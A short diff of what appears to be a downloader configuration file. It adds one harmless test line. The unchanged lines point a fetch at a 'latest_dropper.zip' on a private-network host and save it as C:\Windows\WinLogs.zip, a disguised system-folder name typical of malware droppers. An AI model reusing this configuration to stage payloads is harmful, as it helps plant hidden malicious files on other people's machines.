@@ -1,2 +1,3 @@
 source=http://192.168.100.50:12345/versions/latest_dropper.zip
 downloadzip=C:\\Windows\\WinLogs.zip
+hello=hellofromtermuxtest
